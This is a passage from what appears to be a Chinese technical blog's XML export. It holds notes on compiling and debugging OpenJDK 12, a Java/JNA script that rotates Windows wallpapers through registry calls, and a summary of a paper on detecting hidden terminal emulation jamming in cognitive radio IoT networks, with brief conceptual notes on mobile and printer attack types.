</ul>
<p>（2）缺点</p>
<ul>
<li>必须为每个不同的硬件、操作系统编译对应的发行包</li>
<li>显著降低Java链接过程的动态性</li>
</ul>
<h4 id="四、满足提前编译的Substrate-VM"><a href="#四、满足提前编译的Substrate-VM" class="headerlink" title="四、满足提前编译的Substrate VM"></a>四、满足提前编译的Substrate VM</h4><p>（1）优点</p>
<ul>
<li>可以直接从目标程序开始运行，而无需重复进行Java虚拟机的初始化过程</li>
<li>显著降低内存占用及启动时间</li>
</ul>
<p>（2）缺点</p>
<ul>
<li>要求目标程序是完全封闭的，也就是不能动态加载其他<strong>编译期不可知的</strong>代码和类库</li>
</ul>
<h3 id="1-3-发展的HotSpot"><a href="#1-3-发展的HotSpot" class="headerlink" title="1.3 发展的HotSpot"></a>1.3 发展的HotSpot</h3><p>HotSpot现在支持</p>
<p>（1）模块化</p>
<p>（2）开放大量的编程接口</p>
<h3 id="1-4-OpenJDK与OracleJDK的关系"><a href="#1-4-OpenJDK与OracleJDK的关系" class="headerlink" title="1.4 OpenJDK与OracleJDK的关系"></a>1.4 OpenJDK与OracleJDK的关系</h3><p><img src="/2021/12/24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM/image-20211224103519227.png" alt="image-20211224103519227"></p>
<p>除去OpenJDK支持的字体渲染和OracleJDK支持的JFR，两者代码实质上几乎一致。</p>
<h3 id="1-5-实战：自己编译JDK"><a href="#1-5-实战：自己编译JDK" class="headerlink" title="1.5 实战：自己编译JDK"></a>1.5 实战：自己编译JDK</h3><h4 id="一、源码获取"><a href="#一、源码获取" class="headerlink" title="一、源码获取"></a>一、源码获取</h4><p>（1）<a href="https://hg.openjdk.java.net/jdk/jdk12">https://hg.openjdk.java.net/jdk/jdk12</a></p>
<p>（2）点击左边菜单的browse</p>
<p>（3）点击zip即刻开始下载</p>
<p><img src="/2021/12/24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM/image-20211224104023792.png" alt="image-20211224104023792"></p>
<h4 id="二、系统环境"><a href="#二、系统环境" class="headerlink" title="二、系统环境"></a>二、系统环境</h4><p>Ubuntu18.04</p>
<h4 id="三、构建编译环境"><a href="#三、构建编译环境" class="headerlink" title="三、构建编译环境"></a>三、构建编译环境</h4><p>（1）安装GCC</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install build-essential</span><br></pre></td></tr></table></figure>
<p>（2）安装OpenJDK编译依赖库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install libfreetype6-dev</span><br><span class="line">sudo apt install libcups2-dev</span><br><span class="line">sudo apt install libx11-dev libxext-dev librender-dev libxrandr-dev libxtst-dev libxt-dev</span><br><span class="line">sudo apt install libasound2-dev</span><br><span class="line">sudo apt install libffi-dev</span><br><span class="line">sudo apt install autoconf</span><br></pre></td></tr></table></figure>
<p>（3）为了编译大版本号为N的Java代码，还需下载大版本号至少为N-1的，已经编译好的JDK</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-11-jdk</span><br></pre></td></tr></table></figure>
<h4 id="四、进行编译"><a href="#四、进行编译" class="headerlink" title="四、进行编译"></a>四、进行编译</h4><p>（1）配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash configure [options]</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 参数说明</span></span><br><span class="line">--with-debug-level=&lt;level&gt;：设置编译级别，可选值为release、fastbug、slowdebug，越往后优化的措施越少，带的调试信息就越多。默认为release。</span><br><span class="line"></span><br><span class="line">--with-jvm-variants=&lt;variant&gt;：编译特定模式的HotSpot虚拟机，可以多个模式并存，可选值为server、client、minimal、core、zero、custom。</span><br></pre></td></tr></table></figure>
<p>比如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash configure --with-debug-level=release --with-jvm-variants=server</span><br></pre></td></tr></table></figure>
<p>configure的作用包括：依赖项检查、参数配置、构建输出目录结构等多项职责</p>
<p>配置完成后，会在build目录下生成如linux-x86_64-server-release的子目录</p>
<p>（2）编译JDK</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make images</span><br></pre></td></tr></table></figure>
<p>完成后会在build/linux-x86_64-server-release/下生成images等目录</p>
<p>【注意】多次编译后或目录结构成功产生后，需要再修改配置时，要先清理目录，才能确保新的配置生效。指令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make clean</span><br><span class="line">make dist-clean</span><br></pre></td></tr></table></figure>
<p>（3）复制JDK到JAVA_HOME即可使用</p>
<p>编译完成后，进入OpenJDK源码的build/linux-x86_64-server-release/jdk目录就可看到编译结果，把它复制到JAVA_HOME（一般在usr/lib/jvm）就可作为一个完整的JDK使用。</p>
<h3 id="1-6-在Clion中调试源码"><a href="#1-6-在Clion中调试源码" class="headerlink" title="1.6 在Clion中调试源码"></a>1.6 在Clion中调试源码</h3><p>首先需要编译好的代码。此处再示范一次</p>
<p>（1）<code>bash configure --with-debug-level=release --with-jvm-variants=server</code></p>
<p><img src="/2021/12/24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM/image-20211224145802475.png" alt="image-20211224145802475"></p>
<p>（2）<code>make images</code></p>
<p>（3）</p>
<p>如何“New CMake Project from Sources”</p>
<p><a href="https://www.jetbrains.com/help/clion/creating-new-project-from-scratch.html#import-prj">https://www.jetbrains.com/help/clion/creating-new-project-from-scratch.html#import-prj</a></p>
<p>如何调试openjdk12的代码</p>
<p><a href="https://blog.51cto.com/u_330478/4249643">https://blog.51cto.com/u_330478/4249643</a></p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Java</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>自动更新Windows壁纸的Java脚本</title>
    <url>/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>jna下载地址<a href="https://repo1.maven.org/maven2/net/java/dev/jna/">https://repo1.maven.org/maven2/net/java/dev/jna/</a></p>
<p>这里我下载的是jna-5.9.0.jar </p>
<p>注意jna-platform也要下载下载对应版本</p>
<p><a href="https://blog.csdn.net/weixin_30692969/article/details/114143239">jna安装参考</a></p>
<p><a href="https://blog.csdn.net/iteye_878/article/details/82613410">调用api参考</a></p>
<p><a href="https://www.iteye.com/blog/xpenxpen-2178860">https://www.iteye.com/blog/xpenxpen-2178860</a></p>
<p><a href="https://www.cnblogs.com/new-life/p/9345840.html">https://www.cnblogs.com/new-life/p/9345840.html</a></p>
<p><a href="https://blog.csdn.net/qq_40994260/article/details/107117634">Java: 操作读写注册表(Registry)_RaySunWHUT-CSDN博客_java registry</a></p>
<p>最终函数写法主要参考<a href="https://tieba.baidu.com/p/4743466337">https://tieba.baidu.com/p/4743466337</a></p>
<h2 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h2><p>一、创建Java项目</p>
<p>二、把jna的包导入库中，jar包添加方法参考<a href="https://www.cnblogs.com/yulia/p/6824058.html，具体如下">https://www.cnblogs.com/yulia/p/6824058.html，具体如下</a></p>
<p>（1）File——Project Structure</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211226005832346.png" alt="image-20211226005832346"></p>
<p>（2）Modules——Dependencies——Add——JARS</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211226005651080.png" alt="image-20211226005651080"></p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211226005735303.png" alt="image-20211226005735303"></p>
<p>OK后可以看到Project窗口有了这个Jar包</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211226005809036.png" alt="image-20211226005809036"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试程序</span></span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Library;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Native;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Platform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CLibrary</span> <span class="keyword">extends</span> <span class="title">Library</span> </span>&#123;</span><br><span class="line">        CLibrary INSTANCE = (CLibrary) Native.loadLibrary((Platform.isWindows() ? <span class="string">&quot;msvcrt&quot;</span> : <span class="string">&quot;c&quot;</span>), CLibrary.class);</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">(String format, Object... args)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CLibrary.INSTANCE.printf(<span class="string">&quot;Hello, World\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i &lt; args.length;i++) &#123;</span><br><span class="line">            CLibrary.INSTANCE.printf(<span class="string">&quot;Argument %d: %s\n&quot;</span>, i, args[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>三、把需要使用的dll文件放入到java工程目录下的bin目录下，比如user32.dll，这个文件默认位置为<code>C:\Windows\System32</code></p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211226010908944.png" alt="image-20211226010908944"></p>
<p>查看dll文件中有哪些函数，参考<a href="https://blog.csdn.net/zztoll/article/details/105325155">https://blog.csdn.net/zztoll/article/details/105325155</a></p>
<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><h3 id="注册表换壁纸"><a href="#注册表换壁纸" class="headerlink" title="注册表换壁纸"></a>注册表换壁纸</h3><p>一下代码可以成功通过代码更换壁纸，后续再整理思路和改进自动脚本。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jna.Library;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Native;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Platform;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.platform.win32.Advapi32Util;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.platform.win32.WinReg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CLibrary</span> <span class="keyword">extends</span> <span class="title">Library</span></span>&#123;</span><br><span class="line">        CLibrary INSTANCE = (CLibrary) Native.loadLibrary((Platform.isWindows() ?<span class="string">&quot;user32&quot;</span> : <span class="string">&quot;c&quot;</span>), CLibrary.class);</span><br><span class="line">        <span class="function"><span class="keyword">boolean</span> <span class="title">SystemParametersInfoA</span><span class="params">(<span class="keyword">int</span> uiAction, <span class="keyword">int</span> uiParam, String fnm, <span class="keyword">int</span> fWinIni)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reFreshWallPaper</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,</span><br><span class="line">                <span class="string">&quot;Control Panel\\Desktop&quot;</span>, <span class="string">&quot;Wallpaper&quot;</span>, path);</span><br><span class="line">        <span class="comment">//WallpaperStyle = 10 (Fill), 6 (Fit), 2 (Stretch), 0 (Tile), 0 (Center)</span></span><br><span class="line">        <span class="comment">//For windows XP, change to 0</span></span><br><span class="line">        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,</span><br><span class="line">                <span class="string">&quot;Control Panel\\Desktop&quot;</span>, <span class="string">&quot;WallpaperStyle&quot;</span>, <span class="string">&quot;10&quot;</span>); <span class="comment">//fill</span></span><br><span class="line">        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,</span><br><span class="line">                <span class="string">&quot;Control Panel\\Desktop&quot;</span>, <span class="string">&quot;TileWallpaper&quot;</span>, <span class="string">&quot;0&quot;</span>);   <span class="comment">// no tiling</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 刷新</span></span><br><span class="line">        <span class="comment">// refresh the desktop using User32.SystemParametersInfo(), so avoiding an OS reboot</span></span><br><span class="line">        <span class="keyword">int</span> SPI_SETDESKWALLPAPER = <span class="number">0x14</span>;</span><br><span class="line">        <span class="keyword">int</span> SPIF_UPDATEINIFILE = <span class="number">0x01</span>;</span><br><span class="line">        <span class="keyword">int</span> SPIF_SENDWININICHANGE = <span class="number">0x02</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> result = CLibrary.INSTANCE.SystemParametersInfoA(SPI_SETDESKWALLPAPER, <span class="number">0</span>,</span><br><span class="line">                path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        reFreshWallPaper(<span class="string">&quot;C:\\Users\\victor\\Downloads\\IMG_20211128_164530.jpg&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="从指定目录中读取图片文件名列表"><a href="#从指定目录中读取图片文件名列表" class="headerlink" title="从指定目录中读取图片文件名列表"></a>从指定目录中读取图片文件名列表</h3><p><a href="https://blog.csdn.net/Leo_01169/article/details/84942958">Java 获取指定目录下指定后缀名的文件名称_清平调、其N 的博客-CSDN博客_java获取指定后缀的文件</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;String&gt; <span class="title">getFileName</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    File desktop = <span class="keyword">new</span> File(path);</span><br><span class="line">    String[] arr = desktop.list();</span><br><span class="line">    <span class="keyword">assert</span> arr != <span class="keyword">null</span>;</span><br><span class="line">    ArrayList&lt;String&gt; jpgFileName = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String s : arr) &#123;</span><br><span class="line">        <span class="keyword">if</span>(s.endsWith(<span class="string">&quot;.png&quot;</span>) || s.endsWith(<span class="string">&quot;.jpg&quot;</span>) ) &#123;</span><br><span class="line">            jpgFileName.add(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jpgFileName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="定时更新，目前暂时实现指定秒钟读数后换壁纸"><a href="#定时更新，目前暂时实现指定秒钟读数后换壁纸" class="headerlink" title="定时更新，目前暂时实现指定秒钟读数后换壁纸"></a>定时更新，目前暂时实现指定秒钟读数后换壁纸</h3><p>另外，只顺序遍历目录中图片文件一次</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jna.Library;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Native;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Platform;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.platform.win32.Advapi32Util;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.platform.win32.WinReg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CLibrary</span> <span class="keyword">extends</span> <span class="title">Library</span></span>&#123;</span><br><span class="line">        CLibrary INSTANCE = (CLibrary) Native.loadLibrary((Platform.isWindows() ?<span class="string">&quot;user32&quot;</span> : <span class="string">&quot;c&quot;</span>), CLibrary.class);</span><br><span class="line">        <span class="function"><span class="keyword">boolean</span> <span class="title">SystemParametersInfoA</span><span class="params">(<span class="keyword">int</span> uiAction, <span class="keyword">int</span> uiParam, String fnm, <span class="keyword">int</span> fWinIni)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reFreshWallPaper</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,</span><br><span class="line">                <span class="string">&quot;Control Panel\\Desktop&quot;</span>, <span class="string">&quot;Wallpaper&quot;</span>, path);</span><br><span class="line">        <span class="comment">//WallpaperStyle = 10 (Fill), 6 (Fit), 2 (Stretch), 0 (Tile), 0 (Center)</span></span><br><span class="line">        <span class="comment">//For windows XP, change to 0</span></span><br><span class="line">        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,</span><br><span class="line">                <span class="string">&quot;Control Panel\\Desktop&quot;</span>, <span class="string">&quot;WallpaperStyle&quot;</span>, <span class="string">&quot;10&quot;</span>); <span class="comment">//fill</span></span><br><span class="line">        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER,</span><br><span class="line">                <span class="string">&quot;Control Panel\\Desktop&quot;</span>, <span class="string">&quot;TileWallpaper&quot;</span>, <span class="string">&quot;0&quot;</span>);   <span class="comment">// no tiling</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 刷新</span></span><br><span class="line">        <span class="comment">// refresh the desktop using User32.SystemParametersInfo(), so avoiding an OS reboot</span></span><br><span class="line">        <span class="keyword">int</span> SPI_SETDESKWALLPAPER = <span class="number">0x14</span>;</span><br><span class="line">        <span class="keyword">int</span> SPIF_UPDATEINIFILE = <span class="number">0x01</span>;</span><br><span class="line">        <span class="keyword">int</span> SPIF_SENDWININICHANGE = <span class="number">0x02</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> result = CLibrary.INSTANCE.SystemParametersInfoA(SPI_SETDESKWALLPAPER, <span class="number">0</span>,</span><br><span class="line">                path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;String&gt; <span class="title">getFileName</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        File desktop = <span class="keyword">new</span> File(path);</span><br><span class="line">        String[] arr = desktop.list();</span><br><span class="line">        <span class="keyword">assert</span> arr != <span class="keyword">null</span>;</span><br><span class="line">        ArrayList&lt;String&gt; jpgFileName = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String s : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.endsWith(<span class="string">&quot;.png&quot;</span>) || s.endsWith(<span class="string">&quot;.jpg&quot;</span>) ) &#123;</span><br><span class="line">                jpgFileName.add(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jpgFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        ArrayList&lt;String&gt; name = getFileName(<span class="string">&quot;C:\\Users\\victor\\Downloads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String s:name) &#123;</span><br><span class="line">            reFreshWallPaper(<span class="string">&quot;C:\\Users\\victor\\Downloads\\&quot;</span> + s);</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="IDEA打包jar包的方法"><a href="#IDEA打包jar包的方法" class="headerlink" title="IDEA打包jar包的方法"></a>IDEA打包jar包的方法</h2><p>（1）右键项目名，Open Module Settings</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211227003040279.png" alt="image-20211227003040279"></p>
<p>（2）Artifacts，JAR，From modules with dependencies</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211227003142012.png" alt="image-20211227003142012"></p>
<p>（3）选择要导出的类</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211227003244230.png" alt="image-20211227003244230"></p>
<p>（4）其他默认，OK即可</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211227003450528.png" alt="image-20211227003450528"></p>
<p>（5）Include in project build</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211227003514604.png" alt="image-20211227003514604"></p>
<p>（6）build</p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211227003549800.png" alt="image-20211227003549800"></p>
<p><img src="/2021/12/26/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Windows%E5%A3%81%E7%BA%B8%E7%9A%84Java%E8%84%9A%E6%9C%AC/image-20211227003627902.png" alt="image-20211227003627902"></p>
<p>随机可在对应目录找到jar包</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>autoscript</tag>
      </tags>
  </entry>
  <entry>
    <title>Third Eye Context-Aware Detection for Hidden Terminal Emulation Attacks in Cognitive Radio-Enabled IoT Networks</title>
    <url>/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>IoT security, context-aware detection, Markov chain, hidden Markov model</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul>
<li>IoT  Internet of Things  物联网</li>
<li>认知无线电 Cognitive Radio<ul>
<li>具有学习能力，能与周围环境交互信息，以感知和利用在该空间的可用频谱，并限制和降低冲突的发生。</li>
</ul>
</li>
<li>hidden terminal emulation  隐藏终端仿真</li>
</ul>
<p><img src="/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/image-20210524210542892.png" alt="image-20210524210542892"></p>
<h3 id="HTE-攻击"><a href="#HTE-攻击" class="headerlink" title="HTE 攻击"></a>HTE 攻击</h3><ul>
<li><p><strong>方法概要：</strong>攻击者利用天线辐射方向图来模拟隐藏终端(位置伪造攻击的一种形式)。  </p>
</li>
<li><p><strong>攻击前提：</strong>在先前的工作中，位置伪造被认为是一个本地化问题，锚设备（专门用于定位任何设备的设备）在检测位置伪造攻击中起着重要的作用。但是在大多数物联网应用中，物联网设备不可能配备复杂的本地化功能，在密集的IoT网络中部署锚设备也不现实。因此，在密集的物联网场景中，现成的位置欺骗检测方法不适用。  </p>
</li>
<li><p><strong>攻击过程：</strong></p>
<ul>
<li>攻击者通过wardriving等现有技术获取IoT设备的位置（角度、距离等）</li>
<li>然后根据攻击者的目标或者物理限制，攻击者可能会尝试将其作为被攻击者的所有邻居或者选定邻居的隐藏终端</li>
<li>HTE攻击者在此阶段的主要任务是成功模拟受害者附近的隐藏终端的辐射特性。  </li>
</ul>
</li>
</ul>
<p><img src="/2020/09/18/%E7%94%A8%E4%BA%8E%E8%AE%A4%E7%9F%A5%E6%97%A0%E7%BA%BF%E7%94%B5IoT%E7%BD%91%E7%BB%9C%E4%B8%AD%E9%9A%90%E8%97%8F%E7%BB%88%E7%AB%AF%E4%BB%BF%E7%9C%9F%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%84%9F%E7%9F%A5%E6%A3%80%E6%B5%8B/00隐藏终端仿真攻击.png" alt="00隐藏终端仿真攻击"></p>
<p>图a中，攻击者试图将自己伪装成节点A1，A3，A5的隐藏终端，它们只对A2，A4，A6传输。天线的智能利用使攻击者能够仿真不同的物理场景，如图b，即仿真阶段。 </p>
<p>在此阶段，HTE攻击者继续通过宽带感知来感测工作频带，并分别嗅探发往或发自受害节点的RTS和CTS消息的频带。它试图故意干扰从节点A1，A3和A5发送到受害节点（即A4）的传输。但是，干扰率的选择取决于攻击者的策略。它可能会干扰每次传输，随机干扰或在良性或恶意行为之间采取间歇性策略。在本文中，我们讨论了这些不同的攻击策略，以及它们针对上下文感知的HTE检测方法保持免疫力的能力。这种检测技术将创建一个上下文模型，以区分良性和恶意行为。因此，攻击者将尝试紧密模仿良性模型的行为，以使其未被检测到，但保持其攻击性能。我们认为攻击者（即HTE-1）采取了一种微妙的随机方法，即通过与其自身网络（即HTE-2）中的邻居继续进行常规通信，将其伪装成合法节点，并且攻击者会智能地干扰仅在攻击者闲置时（即未与HTE-2通信）接收受害者的信息。因此，与常规的反应式干扰攻击相比，它提供了不同的检测挑战。</p>
<ul>
<li><strong>攻击结果：</strong>干扰特定的传输  </li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/8964452">https://ieeexplore.ieee.org/document/8964452</a></p>
<h2 id="Oth"><a href="#Oth" class="headerlink" title="Oth"></a>Oth</h2><h3 id="针对移动终端的攻击方式"><a href="#针对移动终端的攻击方式" class="headerlink" title="针对移动终端的攻击方式"></a>针对移动终端的攻击方式</h3><ul>
<li>中间人攻击拦截网络流量</li>
<li>通过操作系统的安全漏洞或者硬件漏洞进行攻击</li>
<li><p>在应用中植入恶意代码</p>
<ul>
<li>BOptions sideloading技术<ul>
<li><a href="https://zhuanlan.zhihu.com/p/40203178">BOption侧载机制</a> </li>
<li><a href="https://www.securityweek.com/attackers-target-iphones-using-open-source-mdm-solution">其他参考</a>  </li>
<li>向合法应用程序中添加恶意代码，目的是在应用程序中注入动态库。  </li>
<li>这些插入应用程序的恶意代码能够收集并盗窃设备中的信息，如电话号码、序列号、位置、联系人、用户照片、短信、邮件、WhatsApp聊天消息等，攻击者可以利用这些信息要挟受害者或实施另外的攻击。  </li>
<li>在设备上安装附加证书以允许远程管理操作的过程中可能会导致潜在的恶意活动。</li>
</ul>
</li>
</ul>
</li>
<li><p>针对电源的Bad Power攻击</p>
</li>
</ul>
<h3 id="针对PC系统"><a href="#针对PC系统" class="headerlink" title="针对PC系统"></a>针对PC系统</h3><ul>
<li>针对打印机的APT攻击<ul>
<li><a href="https://www.freebuf.com/articles/terminal/92482.html">打印机APT攻击</a>  通过LDAP提取Windows Active Directory的证书或者滥用“扫描文件”和“扫描电子邮件”功能  </li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>HTE攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>获取函数地址并调用函数</title>
